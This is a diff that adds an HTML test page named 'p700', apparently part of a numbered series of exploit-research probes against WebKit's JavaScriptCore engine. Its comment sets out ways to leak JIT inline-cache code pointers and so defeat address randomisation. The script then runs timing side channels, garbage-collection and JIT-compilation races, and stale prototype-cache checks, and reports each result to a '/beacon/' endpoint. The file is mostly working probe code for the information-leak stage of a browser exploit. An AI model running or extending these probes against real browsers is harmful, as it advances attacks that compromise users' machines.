@@ -1,0 +1,320 @@
+<!--
+  p700: JSC inline cache stub pointer leak
+
+  JSC's DFG generates inline caches (ICs) for property accesses.
+  Each IC stub is a small piece of JIT-compiled code that contains
+  hardcoded pointers to Structure objects, property storage offsets,
+  and fallback handler addresses. These are CODE POINTERS in the
+  JIT region, which is at a fixed offset from the WebProcess text base.
+
+  Attack angles:
+  A) Megamorphic IC behavior -- when too many Structures pass through
+     an IC, DFG replaces it with a generic lookup. The transition from
+     monomorphic -> polymorphic -> megamorphic may be observable.
+  B) IC repatch timing -- when an IC misses, it repatches. The timing
+     of repatching vs hitting the slow path reveals IC state.
+  C) GC moving objects invalidates ICs. If we trigger GC at the right
+     moment, we might observe the IC in a half-updated state.
+  D) StructureStubInfo leak -- DFG stores per-IC metadata that includes
+     code pointers. If any JS-visible behavior depends on the IC stub
+     address, we can derive it.
+  E) Watchpoint-based IC invalidation -- Structure transitions fire
+     watchpoints that invalidate IC stubs. The invalidation order
+     or observable effects might differ based on stub addresses.
+  F) Concurrent JIT compilation race -- DFG compiles in a background
+     thread. If we mutate objects during DFG compilation, the compiled
+     IC might encode stale Structure pointers.
+
+  CRASH_CLASS: LOW (timing/behavior observation, no corruption)
+  prior art: p697 (StructureID), p698 (DFG internals), p634 (IC reuse)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p700</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P700-START:JSC-IC-STUB-LEAK');
+  var results = [];
+
+  // === SECTION A: Megamorphic IC transition detection ===
+  // DFG ICs go mono -> poly -> mega as more Structures hit them
+  // The exact threshold reveals DFG internal constants
+  b('A:MEGAMORPHIC-THRESHOLD');
+  try {
+    function readProp(obj) {
+      return obj.x;
+    }
+
+    // First: train monomorphic
+    var mono = {x: 42};
+    for (var i = 0; i < 200000; i++) readProp(mono);
+
+    // Now time accesses as we add more Structures
+    var shapes = [];
+    for (var i = 0; i < 20; i++) {
+      var obj = {};
+      for (var j = 0; j <= i; j++) obj['pad' + j] = j;
+      obj.x = 1000 + i;
+      shapes.push(obj);
+    }
+
+    var timings = [];
+    for (var s = 0; s < shapes.length; s++) {
+      // Warm this shape into the IC
+      for (var w = 0; w < 1000; w++) readProp(shapes[s]);
+
+      // Time 10K reads of the mono shape to see IC perf change
+      var t0 = performance.now();
+      for (var i = 0; i < 50000; i++) readProp(mono);
+      var dt = performance.now() - t0;
+      timings.push(dt.toFixed(3));
+    }
+
+    b('A:TIMINGS:' + timings.join(','));
+
+    // Look for a step function (mono->poly or poly->mega transition)
+    var steps = [];
+    for (var i = 1; i < timings.length; i++) {
+      var ratio = parseFloat(timings[i]) / parseFloat(timings[i-1]);
+      if (ratio > 1.5 || ratio < 0.67) {
+        steps.push(i + ':r=' + ratio.toFixed(2));
+      }
+    }
+    if (steps.length > 0) {
+      b('A:TRANSITIONS:' + steps.join(','));
+      results.push('A:ic-transition=' + steps[0]);
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: IC repatch timing oracle ===
+  // First access with a new Structure triggers IC repatching
+  // The repatch itself takes time proportional to IC complexity
+  b('B:REPATCH-TIMING');
+  try {
+    function readY(obj) {
+      return obj.y;
+    }
+
+    // Train with shape A
+    var shapeA = {y: 'A'};
+    for (var i = 0; i < 300000; i++) readY(shapeA);
+    b('B:TRAINED-SHAPE-A');
+
+    // Time single read with new shape (triggers repatch)
+    var repatchTimes = [];
+    for (var trial = 0; trial < 20; trial++) {
+      var newShape = {};
+      for (var j = 0; j < trial; j++) newShape['filler' + j] = j;
+      newShape.y = 'NEW';
+
+      var t0 = performance.now();
+      readY(newShape);
+      var dt = performance.now() - t0;
+      repatchTimes.push(dt.toFixed(4));
+    }
+    b('B:REPATCH-TIMES:' + repatchTimes.join(','));
+
+    // Check if repatch time correlates with shape complexity
+    var first5 = repatchTimes.slice(0, 5).map(parseFloat);
+    var last5 = repatchTimes.slice(-5).map(parseFloat);
+    var avgFirst = first5.reduce(function(a,b){return a+b}, 0) / 5;
+    var avgLast = last5.reduce(function(a,b){return a+b}, 0) / 5;
+    b('B:AVG-FIRST5=' + avgFirst.toFixed(4) + ',AVG-LAST5=' + avgLast.toFixed(4));
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: GC during IC operation ===
+  // Trigger GC while accessing properties to catch IC mid-update
+  b('C:GC-IC-RACE');
+  try {
+    var leakedVals = [];
+
+    function gcRead(obj) {
+      var v = obj.z;
+      return v;
+    }
+
+    var target = {z: 'TARGET'};
+    // Train
+    for (var i = 0; i < 200000; i++) gcRead(target);
+    b('C:TRAINED-200K');
+
+    // Create GC pressure while reading
+    for (var round = 0; round < 10; round++) {
+      // Allocate to trigger GC
+      var garbage = [];
+      for (var i = 0; i < 5000; i++) {
+        garbage.push({data: new ArrayBuffer(1024)});
+      }
+
+      // Read during/after GC
+      var v = gcRead(target);
+      if (v !== 'TARGET') {
+        leakedVals.push(round + ':' + typeof v + '=' + v);
+      }
+
+      garbage = null;
+    }
+
+    if (leakedVals.length > 0) {
+      b('C:GC-LEAK:' + leakedVals.join(','));
+      results.push('C:gc-ic=' + leakedVals.length);
+    } else {
+      b('C:NO-GC-LEAK');
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Structure watchpoint invalidation order ===
+  // When a Structure transitions (property added/deleted),
+  // all ICs watching that Structure are invalidated.
+  // If we can observe the invalidation order, it depends on
+  // IC stub addresses (which are code pointers).
+  b('D:WATCHPOINT-ORDER');
+  try {
+    // Create multiple functions that IC on the same Structure
+    var readers = [];
+    for (var i = 0; i < 10; i++) {
+      readers.push(new Function('obj', 'return obj.val'));
+    }
+
+    // Train all readers on the same shape
+    var shared = {val: 100};
+    for (var r = 0; r < readers.length; r++) {
+      for (var i = 0; i < 100000; i++) readers[r](shared);
+    }
+    b('D:TRAINED-10-READERS');
+
+    // Invalidate by adding a property (Structure transition)
+    shared.newProp = 'invalidate';
+
+    // Time each reader's first access after invalidation
+    var invalidTimes = [];
+    for (var r = 0; r < readers.length; r++) {
+      var t0 = performance.now();
+      for (var i = 0; i < 10000; i++) readers[r](shared);
+      var dt = performance.now() - t0;
+      invalidTimes.push(dt.toFixed(4));
+    }
+    b('D:INVALID-TIMES:' + invalidTimes.join(','));
+
+    // Check if times vary (would suggest address-dependent order)
+    var times = invalidTimes.map(parseFloat);
+    var min = Math.min.apply(null, times);
+    var max = Math.max.apply(null, times);
+    b('D:RANGE:min=' + min.toFixed(4) + ',max=' + max.toFixed(4) + ',ratio=' + (max/min).toFixed(2));
+    if (max / min > 2) {
+      results.push('D:watchpoint-variance');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Concurrent JIT compilation race ===
+  // DFG compiles in a background thread. If we mutate the Structure
+  // of an object while DFG is compiling code that accesses it,
+  // the compiled IC might use a stale Structure pointer.
+  b('E:JIT-COMPILE-RACE');
+  try {
+    var raceObj = {a: 1};
+    var raceResults = [];
+
+    function raceRead(obj) {
+      return obj.a;
+    }
+
+    // Heat up but don't fully compile
+    for (var i = 0; i < 50000; i++) raceRead(raceObj);
+
+    // Now rapidly alternate between mutating and reading
+    for (var round = 0; round < 100; round++) {
+      // Mutate Structure
+      raceObj['temp' + round] = round;
+      delete raceObj['temp' + round];
+
+      // Read -- DFG might be recompiling right now
+      var v = raceRead(raceObj);
+      if (v !== 1) {
+        raceResults.push(round + ':' + v);
+      }
+    }
+
+    if (raceResults.length > 0) {
+      b('E:RACE-HIT:' + raceResults.slice(0, 5).join(','));
+      results.push('E:jit-race');
+    } else {
+      b('E:NO-RACE-HIT');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: Prototype chain IC caching leak ===
+  // When DFG caches a prototype chain lookup, it stores pointers
+  // to each prototype's Structure. Changing the prototype chain
+  // invalidates the cache; the behavior during invalidation may
+  // differ based on chain depth in address-dependent ways.
+  b('F:PROTO-CHAIN-IC');
+  try {
+    // Build a deep prototype chain
+    var protos = [{}];
+    for (var i = 0; i < 10; i++) {
+      var p = Object.create(protos[protos.length - 1]);
+      protos.push(p);
+    }
+    // Put target property on the deepest proto
+    protos[0].deep = 'DEEP_VALUE';
+
+    function readDeep(obj) {
+      return obj.deep;
+    }
+
+    // Train with deepest object
+    var deepObj = Object.create(protos[protos.length - 1]);
+    for (var i = 0; i < 200000; i++) readDeep(deepObj);
+    b('F:TRAINED-DEEP-CHAIN');
+
+    // Measure read time with different chain depths
+    var depthTimes = [];
+    for (var d = 1; d < protos.length; d++) {
+      var obj = Object.create(protos[d]);
+      var t0 = performance.now();
+      for (var i = 0; i < 50000; i++) readDeep(obj);
+      var dt = performance.now() - t0;
+      depthTimes.push(d + ':' + dt.toFixed(3));
+    }
+    b('F:DEPTH-TIMES:' + depthTimes.join(','));
+
+    // Now invalidate by mutating mid-chain proto
+    protos[5].injected = 'INJECT';
+    var postInject = readDeep(deepObj);
+    b('F:POST-INJECT:' + postInject);
+
+    // Shadow the property at a mid-chain level
+    protos[3].deep = 'SHADOWED';
+    var shadowed = readDeep(deepObj);
+    b('F:SHADOWED:' + shadowed);
+    if (shadowed === 'DEEP_VALUE') {
+      b('F:SHADOW-FAILED-IC-STALE');
+      results.push('F:stale-proto-ic');
+    }
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P700-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P700-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P700-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p700: JSC inline cache stub pointer leak probes</pre></body></html>
